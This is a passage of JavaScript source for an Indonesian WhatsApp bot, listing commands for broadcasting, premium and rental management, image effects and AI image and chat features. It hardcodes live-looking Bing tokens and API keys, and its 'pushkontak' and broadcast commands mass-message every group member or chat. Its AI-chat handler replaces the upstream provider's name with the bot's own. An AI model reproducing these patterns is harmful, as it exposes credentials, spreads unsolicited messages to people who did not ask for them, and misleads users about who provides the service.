m.reply('Sukses Broadcast')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bc': case 'broadcast': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning (`Contoh:\n${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let todd = await vreden.reSize(`${setting.pathimg}`, 300, 300) 
m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let apaan of anu) {
await sleep(5000)
vreden.relayMessage(apaan,  {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      amount1000: `1000`,
      requestFrom: '0@s.whatsapp.net',
      noteMessage: {
      extendedTextMessage: {
      text: `${text}`,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true
      }}}}}}, {})
}
m.reply('Sukses Broadcast')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'pushkontak': {
if (!isCreator) return tolakk('*Khusus Owner Bot*')
if (!m.isGroup) return warning('Hanya bisa digunakan di dalam grup')
var name = text.split('|')[0]
var chet = text.split('|')[1]
if (!name) return warning(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} vreden|sv uy udh gw sv back`) 
if (!chet) return warning(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} vreden|sv uy udh gw sv back`) 
let kontk = {
displayName: "Contact",
contacts: [{
displayName: name,
vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;" + name + ";;;\nFN:" + name + "\nitem1.TEL;waid=" + m.sender.split('@')[0] + ":" + m.sender.split('@')[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
}]
}
let pkDetect = await vreden.groupMetadata(m.chat)
if (pkDetect.participants.length > 200) return warning('Batas member maksimal; 200')
m.reply('Gasken pushkontak total member ' + pkDetect.participants.length + ' member')
for (let a of pkDetect.participants) {
vreden.sendMessage(a.id, {
contacts: kontk
})
await sleep(500)
vreden.sendMessage(a.id, {
text: chet,
contextInfo:
{
"externalAdReply": {
"title": botName, 
"body": `Ijin Pushkontak Om`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: instagram, 
thumbnailUrl: pathimg, 
}
}
})
await sleep(500)
} // (?); kirim pesan ke semua peserta grup
m.reply('Group: *' + pkDetect.subject + '*\nMember: ' + pkDetect.participants.length + '\ndelay: 500\nBERHASIL PUSH')
	}
db.data.users[m.sender].exp += await randomNomor(20)
break
/*case 'halooo': {
if (!isCreator) return
if (!m.isGroup) return
let pkDetect = await vreden.groupMetadata(m.chat)
if (pkDetect.participants.length > 200) return
for (let a of pkDetect.participants) {
vreden.sendMessage(a.id, {
text: `https://chat.whatsapp.com/FI9chamB0d4F40PLS98lmA\n\nIzin bang, jangan lupa gabung, ada botnya 🗿🙏`,
contextInfo:
{
"externalAdReply": {
"title": botName, 
"body": `Bot WhatsApp Official`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: instagram, 
thumbnailUrl: pathimg, 
}
}
})
await sleep(5000)
} // (?); kirim pesan ke semua peserta grup
	}
break*/
case 'delchat':
if (!isCreator) return tolakk(mess.OnlyOwner)
var teks = q ? q : m.chat
await vreden.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, teks)
m.reply('Sukses!')
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bcsewa': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning (`Contoh:\n${prefix + command} Tes`)
addCountCmd('bcsewa', m.sender, _cmd)
for (let i of sewa){
await vreden.sendMessage(i.id, { text: text })
await sleep(3000) 
}
m.reply(`Sukses bc ke ${sewa.length}`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'addprem':{
if (!isCreator) return tolakk(mess.OnlyOwner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return warning(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return warning(`Mau yang berapa hari?`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : pcknm.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (ownerNumber.includes(users)) return warning('Tidak Dapat Melakukannya Kepada Owner')
if (users) {
addCountCmd('addprem', m.sender, _cmd)
_prem.addPremiumUser(users, atnm, premium)
m.reply('Sukses')
} else {
var cekap = await vreden.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return warning(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
addCountCmd('addprem', m.sender, _cmd)
_prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses')
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delprem':
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!args[0]) return warning(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
addCountCmd('delprem', m.sender, _cmd)
premium.splice(_prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
m.reply('Sukses!')
} else {
var cekpr = await vreden.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return warning(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
addCountCmd('delprem', m.sender, _cmd)
premium.splice(_prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
m.reply('Sukses!')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'addsewa':
if (!isCreator) return tolakk(mess.OnlyOwner)
if (text < 2) return warning(`Gunakan dengan cara ${prefix+command} *linkgc waktu*\n\nContoh : ${prefix+command} https://chat.whatsapp.com/PnwpPqn0b 30d`)
if (!isUrl(args[0])) return warning(mess.error.Iv)
var url = args[0]
addCountCmd('addsewa', m.sender, _cmd)
url = url.split('https://chat.whatsapp.com/')[1]
if (!text) return warning(`Waktunya?`)
var data = await vreden.groupAcceptInvite(url)
if (_sewa.checkSewaGroup(data, sewa)) return warning(`Bot sudah disewa oleh grup tersebut!`)
_sewa.addSewaGroup(data, args[1], sewa)
m.reply(`Success Add Sewa Group Berwaktu!`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delsewa':
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!m.isGroup) return warning(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
if (!isSewa) return warning(`Bot tidak disewa di Grup ini`)
addCountCmd('delsewa', m.sender, _cmd)
sewa.splice(_sewa.getSewaPosition(args[0] ? args[0] : m.chat, sewa), 1)
fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
m.reply(`Sukses`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'resetlimit':
if (!isCreator) return tolakk(mess.OnlyOwner)
addCountCmd('resetlimit', m.sender, _cmd)
limit = []
fs.writeFileSync('./database/limit.json', JSON.stringify(limit, null, 2))
glimit = []
fs.writeFileSync('./database/glimit.json', JSON.stringify(glimit, null, 2))
m.reply(`Sukses reset limit pengguna`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'carbon': case 'karbon': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
if (m.quoted) {
tulisan = m.quoted.text
} else {
tulisan = text
}
if (!tulisan) return warning(`Contoh : ${prefix+command} Yahya`) 
try {
let buffer = await CarbonifyV1(tulisan)
await vreden.sendMessage(m.chat, { image: buffer, caption: `*[ V1 ]* Carbon Text`}, { quoted: m})
} catch (error) {
try {
let buffer = await CarbonifyV2(tulisan)
await vreden.sendMessage(m.chat, { image: buffer, caption: `*[ V2 ]* Carbon Text`}, { quoted: m})
} catch (error) {
m.reply("Terjadi kesalahan:\n\n" + error)
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ssweb2': case 'ssweb':
{
if (!args[0]) return warning(`Gunakan dengan cara ${prefix+command} type *url web*\n\nList type:\n1.hp\n2.pc\n3.tab\n\nContoh penggunaan : ${prefix+command} hp https://bit.ly/420u6GX`)
if (!args[1]) return warning(`Gunakan dengan cara ${prefix+command} type *url web*\n\nList type:\n1.hp\n2.pc\n3.tab\n\nContoh penggunaan : ${prefix+command} hp https://bit.ly/420u6GX`)
if (args[0] === 'hp'){
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!args[1]) return warning(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
await vreden.sendMessage(m.chat, {image: await ssweb(args[1], "false", "phone"), caption: "*[ V1 ]* Screenshot HP 📡"}, {quoted: m})
} catch (err){
m.reply(mess.error.Iv)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
 } else 
 if (args[0] === 'pc'){
 if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!args[1]) return warning(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
await vreden.sendMessage(m.chat, {image: await ssweb(args[1], "false", "desktop"), caption: "*[ V1 ]* Screenshot PC 📡"}, {quoted: m})
} catch (err){
m.reply(mess.error.Iv)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
 } else 
 if (args[0] === 'tab'){
  if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!args[1]) return warning(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
await vreden.sendMessage(m.chat, {image: await ssweb(args[1], "false", "tablet"), caption: "*[ V1 ]* Screenshot Tablet 📡"}, {quoted: m})
} catch (err){
m.reply(mess.error.Iv)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}else { 
 m.reply(`Mau type apa lu?\n\n- hp\n- pc\n- tab\n\nContoh:\n${prefix + command} hp https://bit.ly/420u6GX`)}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'couple': case 'ppcp':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
let anu = await fetchJson("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let random = anu[Math.floor(Math.random() * anu.length)]
vreden.sendMessage(m.chat,{image: {url: random.male,},caption: `Couple Male`,},{quoted: m,})
vreden.sendMessage(m.chat,{image: {url: random.female,},caption: `Couple Female`,},{quoted: m,})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
//darkjokes
case 'darkjokes': case 'darkjoke':
{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
let darkjoke = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden/main/darkjokes.json`)
const dl_url = await pickRandom(darkjoke)
await vreden.sendMessage(m.chat, {image: { url: dl_url }, caption: "Tetap Tertawa Walaupun Cringe🗿"}, {quoted: m})
} catch (err){
m.reply(util.format(err))
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'meme': case 'memeindo':
{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let memeindo = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden/main/memeindo.json`)
const dl_url = await pickRandom(memeindo)
vreden.sendMessage(m.chat, { image: { url: dl_url.meme }, caption: `nyohhh 🗿` }, { quoted: m })
} catch (err){
m.reply(util.format(err))
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
//ephoto360
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *text*`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
try {
await vreden.sendMessage(m.chat, { image: { url: haldwhd }, caption: `ePhoto360 Maker`}, { quoted: m})
} catch (err) {
m.reply('Terjadi Kesalahan!')
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'addowner':{
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *@tag*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
ownerNumber.push(users)
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`Sukses`)
} else {
m.reply(`Gunakan dengan cara ${prefix + command} *@tag*`)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delowner':{
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *@tag/jid*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
if (!ownerNumber.includes(users)) return warning(`Dia bukan owner`)
ownerNumber.splice(ownerNumber.indexOf(users, 1))
m.reply(`Sukses`)
} else {
m.reply(`Gunakan dengan cara ${prefix + command} *@tag*`)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bingimage2': case 'bingimg2': {
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!text) return warning('Masukan Gambarannya\nContoh:\n1girl, with glasses, in beach')
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
const { BingApi } = require('./lib/bing-image.js');
const bingApi = new BingApi("1-LltPb1L4YU0Y_SOqwRsjr5PXNnHdN-QpzrOtvqnB8JGQ_Fd-0hhytay4QN_Nm39rVepDnsW50Ib8gng5P6KpBbpI17deL-aJ_DLryr62S5VgZNl-I8ieumuyNohlvqiwuoT7tgZgxJMrfi0gM-lPcMDeX-eEz8Cx7cET8D7WP76CIOxtEGolRi7G0AHSopI-AZK-Hqw9O_FmJdYoNIEWC82spWZWqoypbCYscKP0Uk");
const imagesUrls = await bingApi.createImages(text, false);
const totalCount = imagesUrls.length;
const credits = await bingApi.getCredits();

if (totalCount > 0) {
for (let i = 0; i < totalCount; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
vreden.sendMessage(m.chat, { image: { url: imagesUrls[i] }, caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}` }, { quoted: fconver });
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await m.reply(`Failed to send image *(${i + 1}/${totalCount})*`);
}
}
} else {
await m.reply('No images found after filtering.');
}
} catch {
m.reply('Terjadi kesalahan!')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bingimage': case 'bingimg': {
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!text) return warning('Masukan Gambarannya\nContoh:\n1girl, with glasses, in beach')
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let img = await fetchJson(`http://15.235.142.199/api/ai/bingAi?prompt=${text}&apikey=DdUFIJY3sIGZW0g`)
let imgs = img.image
let c = 0
for (let ims of img.image) {
if (c == 0) await vreden.sendMessage(m.chat, { image: { url: ims }, caption: `*[ V1 ]* Bing Photo ✅\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}` }, { quoted: m })
else await vreden.sendMessage(m.sender, { image: { url: ims }}, { quoted: m })
c += 1
await sleep(2000)
}
} catch (error) {
try {
let img = await fetchJson(`http://15.235.142.199/api/ai/bingAi?prompt=${text}&apikey=uhnKkdVjsVeICuI`)
let imgs = img.image
let c = 0
for (let ims of img.image) {
if (c == 0) await vreden.sendMessage(m.chat, { image: { url: ims }, caption: `*[ V1 ]* Bing Photo ✅\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}` }, { quoted: m })
else await vreden.sendMessage(m.sender, { image: { url: ims }}, { quoted: m })
c += 1
await sleep(2000)
}
} catch (error) {
try {
const { BingApi } = require('./lib/bing-image.js');
const bingApi = new BingApi("1nBA7oMssMZ52YJP0hLpJBE9v1UTTJd4p8Yq0AAhyn_19OmtsZ_FCUPcAYso9x2jnO5DkjFXB-h7Tf2wWXCK2SEcEP2un0lDN1gug4Niq7Ci7gTS3IsEtD9eZpe7vYlyVC8cYJ-7c3t26uOs1aK_NGRW0qx4c8fLd-Nb3muT_uB2ZnfUV4wq3vnlFq3hXkVK9PvCrQixmbOtVnyzrvYFmlf9_PlL7Itp32TpOT2V1wSk");
const imagesUrls = await bingApi.createImages(text, false);
const totalCount = imagesUrls.length;
const credits = await bingApi.getCredits();

if (totalCount > 0) {
for (let i = 0; i < totalCount; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
vreden.sendMessage(m.chat, { image: { url: imagesUrls[i] }, caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}` }, { quoted: fconver });
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await m.reply(`Failed to send image *(${i + 1}/${totalCount})*`);
}
}
} else {
await m.reply('No images found after filtering.');
}
} catch {
m.reply('Terjadi kesalahan!')
}
}
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'aidraw': case 'aidrawing': case 'image': case 'img': case 'chatgptimg': case 'openaiimg': case 'aiimg':{
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!text) return warning('Masukan Gambarannya\nContoh:\n1 girl, with glasses, in beach')
if (budy.match(`nigga|sexy|colmek|coli|bokep|tobrut|seksi|sex|sexi|memek|kontol|titit`)) return tolakk('Terdeteksi Kata Aneh, Tidak Dapat Dilanjutkan')
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
const params = {
model: "dreamlike-photoreal-2.0.safetensors [fdcf65e7]",
prompt: text,
style_preset: "3d-model",
steps: 20,
cfg_scale: 7,
seed: -1,
upscale: true,
sampler: "DPM++ 2M Karras",
width: 1024,
height: 1024
}
const generate = await txt2img(params);
await sleep(30000)
const result = await getJobs(generate.job);
await vreden.sendMessage(m.chat, {image: { url: result.imageUrl }, caption: `AI Generator Image🍟`},{quoted: m})
} catch (e) {
m.reply(eror)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'faceswap': {//Fix Qioo
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!args[0]) return warning(`*Masukan Link Source!*\n\nCara:\n${prefix + command} urlsource urltarget\n\nContoh:\n${prefix + command} https://telegra.ph/file/dfe154148659e4a714de7.jpg https://telegra.ph/file/a910de0c7d860c7070100.jpg`)
if (!args[1]) return warning(`*Masukan Link Target!*\n\nCara:\n${prefix + command} urlsource urltarget\n\nContoh:\n${prefix + command} https://telegra.ph/file/dfe154148659e4a714de7.jpg https://telegra.ph/file/a910de0c7d860c7070100.jpg`)
if (!isUrl(args[0])) return warning(`*Masukan Link Source Muka Yang Benar!*\n\nCara:\n${prefix + command} urlsource urltarget\n\nContoh:\n${prefix + command} https://telegra.ph/file/dfe154148659e4a714de7.jpg https://telegra.ph/file/a910de0c7d860c7070100.jpg`)
if (!isUrl(args[1])) return warning(`*Masukan Link Muka Target Yang Benar!*\n\nCara:\n${prefix + command} urlsource urltarget\n\nContoh:\n${prefix + command} https://telegra.ph/file/dfe154148659e4a714de7.jpg https://telegra.ph/file/a910de0c7d860c7070100.jpg`)
try {
const params = {
            sourceUrl: args[0],
            targetUrl: args[1]
        };
        const generate = await faceSwap(params);
        await sleep(30000)
        const result = await getJobs(generate.job);
await vreden.sendMessage(m.chat, {image: { url: result.imageUrl }, caption: `Image Effect FaceSwap 🍟`},{quoted: m})
} catch (error) {
m.reply("Terjadi Kesalahan\n\n" + error)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'img2img': {//Fix Qioo
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!quoted) return warning(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
const input_data = await listModels();
const samplr = await listSampler();
const styler = await getModels();
let media = await vreden.downloadAndSaveMediaMessage(quoted);
let link = await TelegraPh(media);
let [urutan, tema] = text.split("|")
try {
let data = input_data.map((item, index) => ({
            title: item.replace(/[_-]/g, ' ').replace(/\..*/, ''),
            id: item
        }));
if (!urutan) return m.reply("Masukan Models!\n*Contoh:*\n.img2img [nomor]|[query]\n\n*Pilih angka yg ada*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
        if (isNaN(urutan)) return m.reply("Masukan Models Yang Valid!\n*Contoh:*\n.img2img [nomor]|[query]\n\n*Pilih angka yg ada*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
        if (urutan > data.length) return m.reply("Masukan Models Yang Valid!\n*Contoh:*\n.img2img [nomor]|[query]\n\n*Pilih angka yg ada*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
        if (!tema) return warning("*Masukan Teks!*!\n\nContoh:\n.img2img [nomor]|[query]")
        await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
        let out = data[urutan - 1].id
        let imgdata = media.toString('base64')
        const samp = await pickRandom(samplr)
        const sty = await pickRandom(styler[10].enum)
        const params = {
    imageUrl: link,
    imageData: imgdata,
    model: out,
    prompt: tema,
    denoising_strength: 0.7,
    style_preset: sty,
    steps: 20,
    cfg_scale: 7,
    upscale: true,
    sampler: samp,
    width: 1024,
    height: 1024
  };
const generate = await transfrom(params);
await sleep(30000)
const result = await getJobs(generate.job);
await vreden.sendMessage(m.chat, {image: { url: result.imageUrl }, caption: `Image Effect ${out} 🍟`},{quoted: m})
} catch (error) {
m.reply("*Terjadi Kesalahan!*\n\n" + error)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'qiooai':
          {
            if (!text) return m.reply('iya kak?');
            try {
              if (quoted && /image/.test(quoted.mimetype)) {
                let media = await quoted.download()
                let anuk = await qiooaigambar(text, m.sender, true, media)
                const respons = anuk.replace(/luminai/g, "Qioo").replace(/LuminAI/g, "Qioo").replace(/luminAI/g, "Qioo").replace(/Siputzx Production/g, "Vreden").replace(/siputzx production/g, "Vreden")
                balas(respons);
              } else {
                let anuk = await qiooaitext(text, m.sender, true)
                const respons = anuk.replace(/luminai/g, "Qioo").replace(/LuminAI/g, "Qioo").replace(/luminAI/g, "Qioo").replace(/Siputzx Production/g, "Vreden").replace(/siputzx production/g, "Vreden")
                balas(respons);
              }
            } catch (e) {
              m.reply(e);
            }
          }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'qioo': {
if (args[0] === "-start") {
if (db.data.users[m.sender].qioo) return m.reply(`Udah on`)
db.data.users[m.sender].qioo = true
balas("*[ </> ]* Berhasil Diaktifkan")
} else if (args[0] === "-stop") {
if (!db.data.users[m.sender].qioo) return m.reply(`Udah off`)
db.data.users[m.sender].qioo = false
balas(`Bye byee ${db.data.users[m.sender].nama}👋`)
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} -start\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} -stop\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bot': case 'vreden': {
const uploadFile = { upload: vreden.waUploadToServer };
        var imageMessage = await prepareWAMessageMedia(
          {
            image: { url: "https://telegra.ph/file/eb4abdae5dbb792e3e4d9.jpg" },
          },
          uploadFile,
        );
        const product = {
          productImage: imageMessage.imageMessage,
          productId: "7066960336725723",
          title: "I'm Here Mastahhh 🍟",
          description: "Nyari Apa Dek?",
          currencyCode: "IDR",
          priceAmount1000: "30000000",
          productImageCount: 1,
        };
        const productData = {
          product: product,
          businessOwnerJid: "6285643115199@s.whatsapp.net",
        };
        const productMessage = { productMessage: productData };
        var response = await generateWAMessageFromContent(
          m.chat,
          proto.Message.fromObject(productMessage),
          m.quoted && m.quoted.fromMe
            ? { contextInfo: { ...m.msg.contextInfo } }
            : { quoted: m },
        );
